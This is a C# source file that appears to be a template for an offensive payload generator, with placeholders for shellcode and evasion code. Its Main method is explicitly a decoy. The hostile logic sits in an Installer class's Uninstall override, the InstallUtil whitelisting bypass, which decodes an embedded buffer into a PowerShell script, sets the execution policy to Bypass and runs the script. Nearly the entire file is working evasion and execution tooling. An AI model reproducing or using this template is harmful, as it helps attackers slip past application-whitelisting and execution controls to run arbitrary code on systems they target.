using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Text;
using System.Collections.ObjectModel;

//####INCLUDE####

//####DEFINE####

//####CODE####

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        private static void SetupPowerShellEnvironment(PowerShell ps)
        {
            // Set execution policy
            ps.AddCommand("Set-ExecutionPolicy")
                .AddParameter("ExecutionPolicy", "Bypass")
                .AddParameter("Scope", "Process")
                .AddParameter("Force", true);
            ps.Invoke();
            ps.Commands.Clear();
        }

        private static void ProcessResults(PowerShell ps, Collection<PSObject> results)
        {
            if (results != null && results.Count > 0)
            {
                foreach (var result in results)
                {
                    Console.WriteLine(result.ToString());
                }
            }

            // Check for errors
            if (ps.Streams.Error.Count > 0)
            {
                foreach (var error in ps.Streams.Error)
                {
                    Console.WriteLine($"[-] Error: {error.ToString()}");
                }
            }
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //####EVASION####

            byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;

            //####CALL####

            try
            {
                // Convert byte array to command string safely
                string command = "";
                try
                {
                    command = Encoding.UTF8.GetString(buf);
                    if (command.IndexOf('\0') != -1)
                    {
                        command = command.Substring(0, command.IndexOf('\0'));
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error decoding command: {ex.Message}");
                    return;
                }

                Console.WriteLine("[+] Creating PowerShell runspace");
                using (Runspace runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();
                    using (PowerShell ps = PowerShell.Create())
                    {
                        ps.Runspace = runspace;
                        SetupPowerShellEnvironment(ps);

                        Console.WriteLine($"[+] Executing command: {command}");
                        ps.AddScript(command);
                        ps.AddCommand("Out-String");

                        try
                        {
                            Collection<PSObject> results = ps.Invoke();
                            ProcessResults(ps, results);
                        }
                        catch (RuntimeException psEx)
                        {
                            Console.WriteLine($"[-] PowerShell execution error: {psEx.Message}");
                            if (psEx.ErrorRecord != null)
                            {
                                Console.WriteLine($"[-] Error details: {psEx.ErrorRecord.FullyQualifiedErrorId}");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Execution failed: {ex.Message}");
                if (ex.InnerException != null)
                {
                    Console.WriteLine($"[-] Inner Exception: {ex.InnerException.Message}");
                }
            }
        }
    }
}